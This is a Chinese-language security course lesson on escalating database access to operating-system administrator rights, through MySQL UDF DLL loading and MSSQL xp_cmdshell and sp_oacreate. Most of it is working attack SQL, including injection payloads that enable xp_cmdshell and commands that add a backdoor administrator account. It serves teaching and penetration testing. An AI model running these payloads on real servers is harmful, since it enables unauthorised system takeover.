# 网络安全：P100：MSSQL数据库提权实战

![](img/6746035bf93c2e45d7623964a786e3da_0.png)

在本节课中，我们将学习两种主要的数据库提权技术：MySQL的UDF提权和MSSQL的存储过程提权。我们将通过具体的实验步骤，理解如何利用数据库的特定功能，将数据库权限提升为操作系统管理员权限。

![](img/6746035bf93c2e45d7623964a786e3da_2.png)

![](img/6746035bf93c2e45d7623964a786e3da_4.png)

## 概述：数据库提权的基本思路

数据库提权的核心在于利用数据库软件本身的功能或配置漏洞，执行超出数据库范畴的系统命令。这通常需要两个前提：一是获得数据库的较高权限账户（如MySQL的root用户或MSSQL的SA用户），二是目标数据库开启了允许执行外部命令的组件或函数。

上一节我们介绍了通过ADS流创建目录的方法，本节中我们来看看如何利用MySQL的UDF和MSSQL的扩展存储过程进行提权。

## 第一部分：MySQL UDF提权

![](img/6746035bf93c2e45d7623964a786e3da_6.png)

![](img/6746035bf93c2e45d7623964a786e3da_8.png)

UDF（User Defined Function，用户自定义函数）是MySQL的一个特性，允许用户编写自定义函数来扩展MySQL的功能。攻击者可以利用此特性，上传一个包含恶意代码的DLL文件，并创建一个执行系统命令的函数，从而实现提权。

### 场景一：远程数据库连接提权

假设目标主机开启了MySQL远程连接，并且我们通过某种方式获得了数据库的用户名和密码（例如root）。

**步骤1：连接目标数据库**
首先，使用数据库管理工具（如Navicat）远程连接到目标MySQL服务器。连接需要目标主机的IP地址、端口、用户名和密码。
```sql
-- 示例连接信息
主机：192.168.1.101
用户：root
密码：root
```

**步骤2：创建临时表**
连接成功后，在可写的数据库（如`test`）中创建一个临时表，用于存放DLL文件的二进制数据。
```sql
USE test;
CREATE TABLE temp_udf (udf LONGBLOB);
```

![](img/6746035bf93c2e45d7623964a786e3da_27.png)

**步骤3：插入DLL数据**
将预先准备好的、包含执行命令功能的DLL文件转换成十六进制字符串，并插入到刚创建的临时表中。`UNHEX()`函数用于将十六进制字符串转换回二进制数据。
```sql
INSERT INTO temp_udf VALUES(UNHEX(‘4D5A90000300000004000000FFFF...‘)); -- 此处为很长的十六进制字符串
```

![](img/6746035bf93c2e45d7623964a786e3da_29.png)

**步骤4：导出DLL文件**
利用MySQL的`SELECT ... INTO DUMPFILE`语句，将表中二进制数据导出为服务器上的DLL文件。需要指定一个MySQL有写入权限的目录（如插件目录`lib/plugin`）。
```sql
SELECT udf FROM temp_udf INTO DUMPFILE ‘C:\\Program Files\\MySQL\\lib\\plugin\\udf.dll‘;
```

**步骤5：创建自定义函数**
使用导出的DLL文件创建一个用户自定义函数（例如`cmdshell`），该函数用于执行系统命令。
```sql
CREATE FUNCTION cmdshell RETURNS STRING SONAME ‘udf.dll‘;
```

![](img/6746035bf93c2e45d7623964a786e3da_44.png)

![](img/6746035bf93c2e45d7623964a786e3da_45.png)

![](img/6746035bf93c2e45d7623964a786e3da_47.png)

**步骤6：执行系统命令**
现在，可以通过调用`cmdshell`函数来执行任意系统命令。
```sql
SELECT cmdshell(‘whoami‘);
SELECT cmdshell(‘ipconfig‘);
SELECT cmdshell(‘net user hacker Password123! /add‘); -- 添加用户
SELECT cmdshell(‘net localgroup administrators hacker /add‘); -- 将用户加入管理员组
```
执行命令后，可以通过数据库查询返回结果，或者通过添加的管理员账号直接远程登录系统。

### 场景二：结合WebShell提权

在已获得WebShell（网站文件上传权限）但无法执行系统命令的情况下，可以上传一个集成了上述UDF提权步骤的PHP脚本。

![](img/6746035bf93c2e45d7623964a786e3da_49.png)

![](img/6746035bf93c2e45d7623964a786e3da_51.png)

![](img/6746035bf93c2e45d7623964a786e3da_52.png)

**操作流程：**
1.  将UDF提权PHP脚本上传到目标服务器。
2.  通过浏览器访问该脚本。
3.  在脚本界面中输入目标MySQL数据库的连接信息（需要较高权限账户）。
4.  脚本会自动执行：导出DLL -> 创建函数 -> 提供命令执行接口。
5.  通过脚本提供的接口执行系统命令，完成提权。

![](img/6746035bf93c2e45d7623964a786e3da_54.png)

这种脚本自动化了手工步骤，在WebShell环境下更为便捷。

## 第二部分：MSSQL扩展存储过程提权

![](img/6746035bf93c2e45d7623964a786e3da_59.png)

![](img/6746035bf93c2e45d7623964a786e3da_61.png)

MSSQL提供了扩展存储过程（Extended Stored Procedures），允许在数据库内调用操作系统功能。`xp_cmdshell`是最著名的一个，它可以执行Windows命令并返回输出。

![](img/6746035bf93c2e45d7623964a786e3da_63.png)

![](img/6746035bf93c2e45d7623964a786e3da_65.png)

![](img/6746035bf93c2e45d7623964a786e3da_67.png)

### 提权原理与条件

*   **原理**：通过`xp_cmdshell`存储过程执行系统命令。
*   **前提**：需要具备MSSQL的`sysadmin`服务器角色权限（如SA账户）。
*   **版本差异**：在MSSQL 2000中默认开启，在MSSQL 2005及更高版本中默认关闭。

![](img/6746035bf93c2e45d7623964a786e3da_69.png)

![](img/6746035bf93c2e45d7623964a786e3da_71.png)

### 实战步骤：通过SQL注入点提权

假设我们找到了一个存在SQL注入漏洞的MSSQL网站。

**步骤1：判断当前用户权限**
利用注入点执行SQL语句，判断当前数据库用户是否属于`sysadmin`角色。
```sql
-- 原参数：id=1
-- 注入语句：
1 and (select IS_SRVROLEMEMBER(‘sysadmin‘))=1
```
如果页面正常返回，说明当前用户是系统管理员。

**步骤2：判断xp_cmdshell状态**
检查`xp_cmdshell`扩展存储过程是否存在。
```sql
1 and (select count(*) from master.dbo.sysobjects where xtype=‘X‘ and name=‘xp_cmdshell‘)>0
```
如果存在，则尝试直接调用它执行命令。
```sql
1;exec master..xp_cmdshell ‘whoami‘
```
如果返回错误，提示`xp_cmdshell`被禁用，则需要进行开启。

![](img/6746035bf93c2e45d7623964a786e3da_73.png)

![](img/6746035bf93c2e45d7623964a786e3da_74.png)

**步骤3：启用xp_cmdshell**
以`sysadmin`权限启用`xp_cmdshell`。
```sql
1;exec sp_configure ‘show advanced options‘,1;reconfigure;exec sp_configure ‘xp_cmdshell‘,1;reconfigure;
```

**步骤4：执行系统命令提权**
`xp_cmdshell`启用后，即可通过它执行系统命令。
```sql
-- 添加用户
1;exec master..xp_cmdshell ‘net user hacker2 P@ssw0rd /add‘
-- 将用户加入管理员组
1;exec master..xp_cmdshell ‘net localgroup administrators hacker2 /add‘
```
命令执行成功后，即可使用新添加的管理员账号`hacker2`远程登录服务器。

![](img/6746035bf93c2e45d7623964a786e3da_78.png)

### 备用方案：sp_oacreate提权

如果`xp_cmdshell`被删除或无法启用，可以尝试使用`sp_oacreate`和`sp_oamethod`这一组存储过程来调用Windows的OLE对象，同样可以达到执行命令或写入文件的目的。
```sql
-- 启用OLE自动化过程
exec sp_configure ‘show advanced options‘,1;reconfigure;exec sp_configure ‘Ole Automation Procedures‘,1;reconfigure;
-- 使用OLE执行命令（无回显，通常配合写入文件）
declare @shell int;exec sp_oacreate ‘wscript.shell‘,@shell output;exec sp_oamethod @shell,‘run‘,null,‘cmd /c whoami > c:\\temp\\result.txt‘;
```

本节课我们一起学习了两种常见的数据库提权技术：
1.  **MySQL UDF提权**：通过上传自定义的DLL文件并创建函数，使MySQL能够执行系统命令。适用于已获得MySQL高权限账号的场景。
2.  **MSSQL存储过程提权**：主要利用`xp_cmdshell`扩展存储过程来执行系统命令。关键在于当前数据库用户需具备`sysadmin`权限，并且需要开启被禁用的`xp_cmdshell`。

![](img/6746035bf93c2e45d7623964a786e3da_91.png)

![](img/6746035bf93c2e45d7623964a786e3da_93.png)

![](img/6746035bf93c2e45d7623964a786e3da_95.png)

这两种方法的本质都是**利用数据库软件自身的合法功能，突破其安全边界，实现从数据库权限到操作系统权限的跨越**。在实际安全测试中，需要根据目标环境灵活选择和组合利用这些技术。同时，作为防御方，应及时关闭不必要的数据库功能、使用最小权限账户运行服务，并定期更新和打补丁。
